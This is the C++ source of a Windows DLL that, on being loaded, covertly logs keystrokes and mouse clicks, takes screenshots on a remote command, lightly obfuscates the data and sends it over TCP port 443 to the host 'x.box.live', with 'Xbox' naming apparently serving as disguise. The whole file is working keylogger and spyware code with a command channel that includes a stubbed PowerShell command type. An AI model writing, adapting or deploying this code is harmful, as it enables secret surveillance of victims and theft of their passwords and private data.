// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#define DEV 0

#include <Windows.h>
#include <WinSock2.h>
#if DEV
#include <stdio.h>
#include <stdlib.h>
#define FORMAT_BUFF_SIZE 0x100
#endif
#include <ws2tcpip.h>
#include "XboxClient.pb.h"

#ifndef max
#define max(a,b)            (((a) > (b)) ? (a) : (b))
#endif

#ifndef min
#define min(a,b)            (((a) < (b)) ? (a) : (b))
#endif

#include <atlimage.h>

#pragma comment(lib, "WS2_32")

HHOOK hKeyboardHook = 0;

HMODULE hInstance = 0;
HANDLE hThread = 0;

DWORD TakeScreenShot(LPVOID param);

inline DWORD Random(DWORD min, DWORD max) {
	return min + (rand() % (max - min + 1));
}

#if DEV
VOID Log(LPCSTR fmt, ...) {

	va_list argptr;
	DWORD tmp;
	HANDLE hLog = CreateFileA("D:\\z\\svc.txt", FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hLog == INVALID_HANDLE_VALUE) {
		return;
	}

	va_start(argptr, fmt);

	LPSTR buff = (LPSTR)LocalAlloc(LMEM_FIXED, FORMAT_BUFF_SIZE);
	if (!buff) {
		return;
	}

	int ret = vsprintf_s(buff, FORMAT_BUFF_SIZE, fmt, argptr);
	buff[ret] = 0x00;

	WriteFile(hLog, buff, strlen(buff), &tmp, NULL);

	va_end(argptr);

	LocalFree(buff);
	CloseHandle(hLog);
}
#else
#define Log(fmt, ...)
#endif

DWORD Exchange(Xbox::TCP* tcp) {

	SOCKET connectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	DWORD dwRet = 0;

	addrinfo hints;
	addrinfo* result = NULL;
	addrinfo* ptr = NULL;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData)) {
		Log("WSAStartup\n");
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo("x.box.live", "443", &hints, &result)) {
		Log("getaddrinfo\n");
		WSACleanup();
		return 1;
	}

	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		connectSocket = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, 0, 0);
		if (connectSocket == INVALID_SOCKET) {
			Log("WSASocketW\n");
			WSACleanup();
			return 1;
		}
		if (WSAConnect(connectSocket, ptr->ai_addr, ptr->ai_addrlen, NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			closesocket(connectSocket);
			Log("WSAConnect\n");
			connectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (connectSocket == INVALID_SOCKET) {
		WSACleanup();
		return 1;
	}

	DWORD szBuff = tcp->ByteSizeLong();
	LPSTR lpBuff = (LPSTR)HeapAlloc(GetProcessHeap(), 0, szBuff);
	if (!lpBuff) {
		return 1;
	}

	DWORD dwBytesSent;
	DWORD dwFlags = 0;
	tcp->SerializeToArray(lpBuff, szBuff);

	WSAOVERLAPPED SendOverlapped;
	SecureZeroMemory((PVOID)&SendOverlapped, sizeof(WSAOVERLAPPED));
	SendOverlapped.hEvent = WSACreateEvent();
	if (SendOverlapped.hEvent == NULL) {
		Log("WSACreateEvent failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(connectSocket);
		return 1;
	}

	WSABUF dataBuf[] = {
		{4, (CHAR*)&szBuff},
		{szBuff, lpBuff}
	};

	if (WSASend(connectSocket, dataBuf, 2, &dwBytesSent, NULL, &SendOverlapped, NULL)) {
		Log("WSASend\n");
		return 1;
	}

	if (WSAWaitForMultipleEvents(1, &SendOverlapped.hEvent, TRUE, INFINITE, TRUE) == WSA_WAIT_FAILED) {
		Log("WSAWaitForMultipleEvents\n");
		return 1;
	}

	if (!WSAGetOverlappedResult(connectSocket, &SendOverlapped, &dwBytesSent, FALSE, &dwFlags)) {
		Log("WSASend  failed\n");
		return 1;
	}

	WSAResetEvent(SendOverlapped.hEvent);
	WSACloseEvent(SendOverlapped.hEvent);

	HeapFree(GetProcessHeap(), 0, lpBuff);
	lpBuff = 0;

	Log("Sent %d bytes\n", dwBytesSent);

	szBuff = 0x1000;
	lpBuff = (LPSTR)HeapAlloc(GetProcessHeap(), 0, szBuff);
	if (!lpBuff) {
		return 1;
	}
	ZeroMemory(lpBuff, szBuff);

	WSABUF recvBuf;
	dwFlags = 0;
	recvBuf.len = szBuff;
	recvBuf.buf = lpBuff;
	if (WSARecv(connectSocket, &recvBuf, 1, &dwBytesSent, &dwFlags, NULL, NULL)) {
		Log("WSARecv\n");
		return 1;
	}

	Xbox::TCP rsp;

	rsp.ParseFromArray(recvBuf.buf, dwBytesSent);
	if (rsp.packet_size() > 0) {
		for (int i = 0, l = rsp.packet_size(); i < l; i++) {
			Xbox::XboxPacket_CmdType cmd = rsp.packet(i).cmd();
			if (cmd == Xbox::XboxPacket_CmdType::XboxPacket_CmdType_SCREENSHOT) {
				HANDLE hCmd = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)TakeScreenShot, NULL, CREATE_SUSPENDED, NULL);
				if (hCmd) {
					ResumeThread(hCmd);
				}
			} else if (cmd == Xbox::XboxPacket_CmdType::XboxPacket_CmdType_POWERSHELL) {
				Sleep(50);
			}
		}
	}
	rsp.Clear();

	HeapFree(GetProcessHeap(), 0, lpBuff);
	lpBuff = 0;

	closesocket(connectSocket);
	WSACleanup();

	return 0;
}

DWORD TakeScreenShot(LPVOID param) {

	keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
	keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);

	HBITMAP hBitmap;

	Sleep(250);

	OpenClipboard(NULL);
	hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);
	CloseClipboard();

	IStream* stream = NULL;
	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
	CImage image;
	ULARGE_INTEGER liSize;

	image.Attach(hBitmap);
	image.Save(stream, Gdiplus::ImageFormatJPEG);
	IStream_Size(stream, &liSize);
	DWORD len = liSize.LowPart;
	IStream_Reset(stream);
	LPSTR buf = (LPSTR)HeapAlloc(GetProcessHeap(), 0, len);
	if (!buf) {
		return 1;
	}

	IStream_Read(stream, buf, len);
	stream->Release();

	for (int i = 0, l = len - 1; i < l; i++) {
		buf[i] = buf[i] ^ buf[i + 1];
	}

	Xbox::TCP tcp;
	Xbox::XboxPacket* pkg = tcp.add_packet();
	pkg->set_id(0);
	pkg->set_time(GetTickCount64());
	pkg->set_cmd(Xbox::XboxPacket_CmdType::XboxPacket_CmdType_SCREENSHOT);
	pkg->set_data(buf, len);

	Exchange(&tcp);
	tcp.Clear();

	HeapFree(GetProcessHeap(), 0, buf);
	return 0;
}

DWORD Capture(LPVOID lpThreadParameter) {

	Log("Start Capture\n");

	BOOL SHIFT = FALSE;
	BOOL CAPITAL = FALSE;
	CHAR buff[2] = {0};

	Xbox::TCP tcp;

	DWORD id = 0;
	POINT pos = {0};
	DWORD szTcp;
	BOOL bNewData = FALSE;

	while (TRUE) {
		Sleep(10);

		SHIFT = (GetKeyState(VK_LSHIFT) & 0x8000) == 0x8000;
		CAPITAL = (GetKeyState(VK_CAPITAL) & 0x1) != 0;

		if ((GetAsyncKeyState(VK_LBUTTON) & 0x8001) == 0x8001) {

			Xbox::XboxPacket* pkg = tcp.add_packet();
			GetCursorPos(&pos);
			Log("<l-click>%d-%d", pos.x, pos.y);

			pos.x ^= 0xCAFEFAAA;
			pos.y ^= 0xCAFEFAAA;

			pkg->set_cmd(Xbox::XboxPacket_CmdType::XboxPacket_CmdType_MOUSE0);
			pkg->set_time(GetTickCount64());
			pkg->set_id(id);
			pkg->set_data((CHAR*)&pos, sizeof(POINT));
			id += 1;
			bNewData = TRUE;
		}

		if ((GetAsyncKeyState(VK_RBUTTON) & 0x8001) == 0x8001) {

			Xbox::XboxPacket* pkg = tcp.add_packet();
			GetCursorPos(&pos);
			Log("<r-click>%d-%d", pos.x, pos.y);

			pos.x ^= 0xCAFEFAAA;
			pos.y ^= 0xCAFEFAAA;

			pkg->set_cmd(Xbox::XboxPacket_CmdType::XboxPacket_CmdType_MOUSE1);
			pkg->set_time(GetTickCount64());
			pkg->set_id(id);
			pkg->set_data((CHAR*)&pos, sizeof(POINT));
			id += 1;
			bNewData = TRUE;
		}

		for (BYTE i = 0x30; i <= 0x39; i++) {
			if ((GetAsyncKeyState(i) & 0x8001) != 0x8001) {
				continue;
			}
			buff[0] = i + 0x66;
			buff[1] = rand() & 0xFF;
			Log("%s", buff);

			Xbox::XboxPacket* pkg = tcp.add_packet();
			pkg->set_cmd(Xbox::XboxPacket_CmdType::XboxPacket_CmdType_KEYBOARD);
			pkg->set_time(GetTickCount64());
			pkg->set_id(id);
			pkg->set_data(buff, 2);
			id += 1;
			bNewData = TRUE;
		}

		for (BYTE i = 0x60; i <= 0x69; i++) {
			if ((GetAsyncKeyState(i) & 0x8001) != 0x8001) {
				continue;
			}
			buff[0] = i - 0x30 + 0x66;
			buff[1] = rand() & 0xFF;
			Log("%s", buff);

			Xbox::XboxPacket* pkg = tcp.add_packet();
			pkg->set_cmd(Xbox::XboxPacket_CmdType::XboxPacket_CmdType_KEYBOARD);
			pkg->set_time(GetTickCount64());
			pkg->set_id(id);
			pkg->set_data(buff, 2);
			id += 1;
			bNewData = TRUE;
		}

		for (BYTE i = 0x41; i <= 0x5A; i++) {
			if ((GetAsyncKeyState(i) & 0x8001) != 0x8001) {
				continue;
			}
			buff[0] = i + 0x20 + 0x66;
			buff[1] = rand() & 0xFF;
			if (CAPITAL || SHIFT) {
				buff[0] -= 0x20;
			}

			Log("%s", buff);

			Xbox::XboxPacket* pkg = tcp.add_packet();
			pkg->set_cmd(Xbox::XboxPacket_CmdType::XboxPacket_CmdType_KEYBOARD);
			pkg->set_time(GetTickCount64());
			pkg->set_id(id);
			pkg->set_data(buff, 2);
			id += 1;
			bNewData = TRUE;
		}

		if ((GetAsyncKeyState(0x20) & 0x8001) == 0x8001) {
			buff[0] = 0x20 + 0x66;
			buff[1] = rand() & 0xFF;
			Log("%s", buff);

			Xbox::XboxPacket* pkg = tcp.add_packet();
			pkg->set_cmd(Xbox::XboxPacket_CmdType::XboxPacket_CmdType_KEYBOARD);
			pkg->set_time(GetTickCount64());
			pkg->set_id(id);
			pkg->set_data(buff, 2);
			id += 1;
			bNewData = TRUE;
		}

		if (bNewData) {
			szTcp = tcp.packet_size();
			if (szTcp < 32 || szTcp <= Random(5, 10)) {
				continue;
			}

			Log("Exchange\n");

			if (!Exchange(&tcp)) {
				tcp.Clear();
			}
		}
		bNewData = FALSE;
	}

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	GOOGLE_PROTOBUF_VERIFY_VERSION;
	switch (ul_reason_for_call) {
		case DLL_PROCESS_ATTACH:
			{
				hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Capture, NULL, NULL, NULL);
			}
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

